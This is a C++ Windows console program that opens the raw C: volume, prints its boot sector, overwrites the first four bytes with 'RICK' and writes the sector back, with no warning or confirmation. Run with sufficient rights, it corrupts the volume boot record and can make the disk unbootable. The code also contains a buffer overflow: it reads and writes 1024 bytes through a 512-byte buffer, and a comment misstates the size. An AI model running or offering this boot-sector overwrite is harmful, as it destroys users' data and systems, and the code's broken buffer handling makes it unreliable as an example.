// ConsoleApplication3.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <string>

int main()
{
	//_TCHAR volumePath[7];
	//_sntprintf_s(volumePath, 6, _T("\\\\.\\C:"));
	//volumePath[6] = _T('\0');

	DWORD FilePos;


	// Open read/write handle to volume
	HANDLE hVolume;
	hVolume = CreateFile(_T("\\\\.\\C:"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hVolume != INVALID_HANDLE_VALUE) {	
		printf("Succeeded to open volume.\n\n");
		
		DWORD num;
		char out[512] = { 0 };
		
		// Initialize pointer to offset and set pointer
		LARGE_INTEGER frAddr;
		frAddr.QuadPart = 0x0; //512 = 200
		frAddr.LowPart = SetFilePointer(hVolume, frAddr.LowPart, &frAddr.HighPart, FILE_BEGIN);

		printf("Pos: %d\n\n", frAddr.LowPart);

		// Read 8192 bytes from volume
		ReadFile(hVolume, &out, 512, &num, NULL);
		frAddr.LowPart = SetFilePointer(hVolume, frAddr.LowPart, &frAddr.HighPart, FILE_BEGIN);

		int i;

		// Print boot sector
		for (i = 0; i < 512; ++i)
			printf("%c", ((char *)out)[i]);
		
		// Bytes to original: \xEB R \x90 N
		out[0] = 'R';
		out[1] = 'I';
		out[2] = 'C';
		out[3] = 'K';
		BOOL bErrorFlag = FALSE;
		BOOL isMounted = FALSE;
		BOOL isLocked = FALSE;
		LPDWORD lpBytesReturned = NULL;

		// Check if device mounted & in use
		isMounted = DeviceIoControl(hVolume, FSCTL_IS_VOLUME_MOUNTED, NULL, 0, NULL, 0, lpBytesReturned, NULL);

		if (FALSE == isMounted)
		{
			printf("\n\nNot mounted");
		}
		else {
			printf("\n\nMounted");
		}

		//FSCTL_LOCK_VOLUME - Not possible: Because the volume is already in use, so returns false
		isLocked = DeviceIoControl(hVolume, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);

		if (FALSE == isLocked)
		{
			printf("\n\nUnable to lock");
		}
		else {
			printf("\n\nLocked!");
		}

		//If LOCK volume not possible: WriteFile also not possible, unless boot sector or outside volume area.
		bErrorFlag = WriteFile(hVolume, out, 1024, NULL, NULL);

		if (FALSE == bErrorFlag)
		{
			printf("\n\nUnable to write to file.\n");
		}

		frAddr.LowPart = SetFilePointer(hVolume, frAddr.LowPart, &frAddr.HighPart, FILE_BEGIN);

		printf("\n\n\n");

		ReadFile(hVolume, &out, 1024, &num, NULL);

		// Print new content from buffer
		for (i = 0; i < 1024; ++i)
			printf("%c", ((char *)out)[i]);

	}
	else {
		printf("Failed");
	}

	std::cin.get();
    return 0;
}

